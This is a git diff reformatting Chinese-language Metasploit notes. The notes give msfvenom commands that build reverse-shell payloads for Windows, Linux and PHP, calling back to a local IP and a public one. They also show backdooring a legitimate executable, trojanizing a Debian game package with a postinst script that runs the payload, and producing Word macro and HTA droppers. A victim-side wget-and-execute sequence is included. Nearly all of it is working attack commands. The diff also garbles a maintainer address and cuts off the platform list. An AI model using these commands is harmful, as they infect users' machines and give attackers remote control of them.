@@ -1,8 +1,11 @@
+##  
 
-	@制作Windows恶意软件获取shell@
-sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/xiao1.exe
+制作Windows恶意软件获取shell
 
+```sh
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/xiao1.exe
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=47.95.141.60 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/xiao/win.exe
+```
 
 --platform 指定平台
 -p 指定payload类型
@@ -13,7 +16,9 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=47.9
 -f 指定输出格式
 -o 指定文件名称和导出位置
 
-	msfconsole
+```sh
+msfconsole
+
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp 
 options
@@ -24,33 +29,47 @@ background   将会话保存到后台
 
 sessions
 sessions -i 1  指定会话ID，调用新的会话
+```
 
-	@给软件加上后门@
+## 给软件加上后门
+
+```sh
 sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -x /home/xiaoxiaoran/temp/Terminal.exe -f exe -o /var/www/html/xiao2.exe
+```
 
-	@php@
+## php
+
+```sh
 use payload/php/meterpreter_reverse_tcp
 generate -f raw -o /var/www/html/back.php
+```
 
+## 制作Linux恶意软件获取shell
 
-	@制作Linux恶意软件获取shell@
+```sh
 sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
+```
 
 -f 指定elf即linux操作系统的可执行文件类型
 
-	msfconsole
+```sh
+msfconsole
+
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.100.143
 set LPORT 4444
 exploit
+```
 
 	centos8
-wget http://192.168.100.143/xiao3
-chmod +x xiao3
-./xiao3
+	
+	wget http://192.168.100.143/xiao3
+	chmod +x xiao3
+	./xiao3
+## 制作恶意deb软件包来触发后门
 
-	@制作恶意deb软件包来触发后门@
+```sh
 apt --download-only install freesweep
 mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb  /home/xiaoxiaoran/temp/free.deb
 dpkg -x freesweep_1.0.1-1_amd64.deb free   解压软件包到free目录
@@ -65,13 +84,15 @@ Version: 1.0.1-1
 Section: Games and Amusement
 Priority: optional
 Architecture: amd64
-Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+Maintainer: Ubuntu MOTU Developers (ubuntu-motu##lists.ubuntu.com)
 Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 EOF
 
 tee /home/xiaoxiaoran/temp/free/DEBIAN/postinst << 'EOF'
+
 #!/bin/bash
+
 sudo chmod 2755 /usr/games/freesweep_sources
 sudo /usr/games/freesweep_sources & 
 EOF
@@ -80,9 +101,13 @@ chmod +755 DEBIAN/postinst
 dpkg-deb --build free xfree.deb
 
 dpkg -i xfree.deb
+```
 
-	@利用宏感染word文档获取shell@
-	
+
+
+## 利用宏感染word文档获取shell
+
+```sh
 sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe >1.txt
 
 MACRO CODE  宏代码
@@ -93,12 +118,17 @@ set payload windows/meterpreter/reverse_tcp
 options
 set lhost 192.168.100.143
 exploit   
+```
 
-	@hta文件@
+## hta文件
+
+```sh
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -f hta-psh -o /var/www/html/1.hta
+```
 
+## 帮助
 
-
+```sh
 -p，--payload <payload>        要使用的有效负载。指定一个' - '或stdin来使用自定义有效载荷
 
 --payload-options        列出有效载荷的标准选项
@@ -140,12 +170,11 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192
  --smallest                               最小生成最小可能的有效负载
 
 -h，--help                                            显示此帮助消息
-	
-	
-	
-以下是使用-platform选项时可以输入的可用平台列表。
+```
 
-Cisco 或 cisco
+## 可用平台列表
+
+以下是使用-platform选项时可以输入的Cisco 或 cisco
 
 OSX 或 osx
 
